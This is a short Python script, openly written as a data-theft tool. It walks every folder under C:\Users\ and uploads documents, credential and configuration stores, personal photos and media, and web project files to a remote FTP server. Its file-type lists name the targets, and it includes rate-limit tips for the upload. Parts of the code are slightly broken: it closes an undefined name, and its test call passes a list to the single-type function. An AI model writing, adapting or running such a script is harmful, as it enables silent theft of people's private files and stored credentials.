import os, fnmatch, ftplib, time

#Start FTP Session - Credentials
session = ftplib.FTP('server','username','password')

#Exfiltrate and send file based on filetype.
def exfiltrate(filetype):
    for parent, directories, filenames in os.walk("C:\\Users\\"):
        for filename in fnmatch.filter(filenames, "*%s" % filetype):
            document_path = os.path.join(parent, filename)
            time.sleep(0.2) #Give ftp 200ms to relax. Change or remove based on your rate-limits.
            ftpsend = open(document_path,'rb')
            session.storbinary('STOR %s' % filename, ftpsend) #FTP STOR command.
            file.close()
           
#Test file. So you wont send 1000 files during testing.
test_list = [
    ".test3824"
]
           
#List of filetypes for documents.
doc_list = [
    ".pdf",
    ".doc",
    ".odt",
    ".rtf",
    ".ppt",
    ".pptx",
    ".ppx",
    ".txt",
    ".epub",
    ".mobi",
    ".csv",
    ".xlsx",
    ".xls",
    ".docx",
    ".xps",
    ".xlt",
    ".xlsb",
    ".xlsm",
    ".ppa",
    ".pps"
]

#List of filetypes for common credentialstorage and configuration files.
cred_list = [
    ".sql",
    ".sqlite",
    ".dat",
    ".default",
    ".xml",
    ".bak",
    ".profile",
    ".yaml",
    ".json",
    ".stg",
    ".tdat",
    ".purple"
]

#Personal files like pictures and media.
personal_list = [
    ".wav",
    ".mp4",
    ".jpg",
    ".jpeg",
    ".png",
    ".gif",

]

#List of random project files for development.
project_list = [
    ".php",
    ".html",
    ".js",
    ".css"
]

#Function for exfiltrating lists of filetypes.
def exfiltratelist(filelist):
    for i in filelist:
        exfiltrate(i)

#Call test exfiltration
exfiltrate(test_list)

#Quit FTP Session
session.quit()
